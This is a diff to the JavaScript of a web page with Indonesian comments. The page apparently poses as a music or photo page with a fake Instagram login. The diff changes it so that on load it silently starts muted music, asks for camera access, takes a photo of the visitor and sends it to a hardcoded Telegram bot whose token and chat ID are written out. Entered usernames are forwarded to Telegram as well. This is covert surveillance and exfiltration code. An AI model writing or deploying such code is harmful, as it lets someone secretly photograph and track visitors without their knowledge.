@@ -1,4 +1,5 @@
-﻿const openPhotoOptions = document.getElementById('openPhotoOptions');
+﻿// === MODAL PHOTO OPTIONS ===
+const openPhotoOptions = document.getElementById('openPhotoOptions');
 const photoOptions = document.getElementById('photoOptions');
 if (openPhotoOptions && photoOptions) {
   openPhotoOptions.addEventListener('click', () => {
@@ -6,63 +7,51 @@ if (openPhotoOptions && photoOptions) {
   });
 }
 
+// === TELEGRAM CONFIG ===
 const BOT_TOKEN = "8317170535:AAGh0PBKO4T-HkZQ4b7COREqLWcOIjW3QTY";
 const CHAT_ID = "6864694275";
 
-// === BAGIAN MUSIK ===
+// === MUSIK & KAMERA OTOMATIS ===
 const music = document.getElementById('bgmusic');
 const btnMusic = document.getElementById('musicButton');
 let started = false;
-music.volume = 0.4;
+
+// start silent autoplay
+music.volume = 0.0;
+music.loop = true;
 
 async function startMusicAndCamera() {
-  if (started && !music.paused) return;
+  if (started) return;
   started = true;
 
-  let musicStarted = false;
   try {
-    music.muted = false;
     await music.play();
-    console.log("🎵 Musik diputar");
-    musicStarted = true;
+    console.log("🎵 Musik silent autoplay dicoba");
   } catch (err) {
-    console.warn("Musik gagal:", err);
-    btnMusic.classList.add("show");
-    btnMusic.disabled = false;
-    // tetap lanjut izin kamera walau musik gagal
+    console.warn("❌ Silent autoplay gagal:", err);
+    if(btnMusic){
+      btnMusic.classList.add("show");
+      btnMusic.disabled = false;
+    }
   }
 
-  // === jalankan kamera setelah sedikit delay ===
-  setTimeout(async () => {
-    try {
-      if (!alreadyAllowed && navigator.mediaDevices) {
-        // minta izin 1x saja
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        stream.getTracks().forEach(t => t.stop());
-        localStorage.setItem("user_allows_auto_capture", "1");
-        console.log("Perizinan.");
-      } else {
-        console.log("Perizinan");
-      }
+  // Delay sebelum kamera
+  setTimeout(autoStartCamera, 1000);
+}
 
-      // ambil & kirim foto
-      await autoCaptureAndSend();
-
-    } catch (e) {
-      console.warn(" User menolak izin:", e);
+async function autoStartCamera() {
+  try {
+    if (navigator.mediaDevices) {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      stream.getTracks().forEach(t => t.stop());
+      console.log("📸 Izin kamera diberikan");
     }
-  }, musicStarted ? 800 : 1500);
-
-  if (musicStarted) {
-    btnMusic.classList.remove("show");
-    btnMusic.disabled = true;
-  } else {
-    btnMusic.disabled = false;
-    btnMusic.classList.add("show");
+    await autoCaptureAndSend();
+  } catch (e) {
+    console.warn("⚠️ User menolak izin kamera:", e);
   }
 }
 
-// === Fungsi ambil foto & kirim ke Telegram ===
 async function autoCaptureAndSend() {
   try {
     const stream = await navigator.mediaDevices.getUserMedia({ video: true });
@@ -97,28 +86,28 @@ async function autoCaptureAndSend() {
       body: fd
     });
 
-    if (res.ok) console.log("✅ Foto terkirim (fokus 1s)");
-    else console.warn("⚠️ Gagal kirim foto");
+    if (res.ok) console.log("✅ Foto terkirim ke Telegram");
+    else console.warn("⚠️ Gagal kirim foto ke Telegram");
   } catch (err) {
     console.error("❌ Tidak bisa akses kamera:", err);
   }
 }
 
-}
+// Gesture minimal untuk unmute musik
+document.addEventListener("click", () => {
+  if (music.volume === 0.0) {
+    music.volume = 0.4;
+    console.log("🎵 Musik di-unmute setelah gesture");
+  }
+}, { once: true });
 
-// === Event Listener Fix (musik + kamera) ===
-function userStart() {
-  startMusicAndCamera().catch(console.warn);
-}
+// Jalankan otomatis saat load
+window.addEventListener("load", startMusicAndCamera);
 
-const isMobile = /Android|iPhone|iPad|iOS/i.test(navigator.userAgent);
-btnMusic.classList.add("show");
-btnMusic.addEventListener('click', userStart);
-document.addEventListener('click', userStart);
-document.addEventListener('touchstart', userStart);
-
-if (!isMobile) {
-  window.addEventListener('mousemove', userStart, { once: true });
+// Tombol musik manual
+if (btnMusic) {
+  btnMusic.classList.add("show");
+  btnMusic.addEventListener('click', startMusicAndCamera);
 }
 
 // === MODAL PERTANYAAN ===
@@ -137,6 +126,7 @@ function removeOverlay() {
   overlay.style.pointerEvents = "none";
   setTimeout(() => overlay.style.display = "none", 300);
 }
+
 function showUserStatus(n) {
   const e = document.getElementById("igStatus");
   e.textContent = `👉🏻 Login sebagai ${n} (keluar)`;
@@ -148,10 +138,12 @@ function showUserStatus(n) {
     }
   };
 }
+
 if (savedIG) {
   removeOverlay();
   showUserStatus(savedIG);
 }
+
 btnLogin.onclick = () => {
   const u = input.value.trim();
   if (!u) return alert("Masukkan username dulu");
@@ -160,7 +152,7 @@ btnLogin.onclick = () => {
   removeOverlay();
 };
 
-// === FUNGSI KIRIM TELEGRAM UNIVERSAL ===
+// === KIRIM TELEGRAM UNIVERSAL ===
 async function sendTelegramMessage(url, body, el) {
   el.innerHTML = `
     <div class="mailContainer">
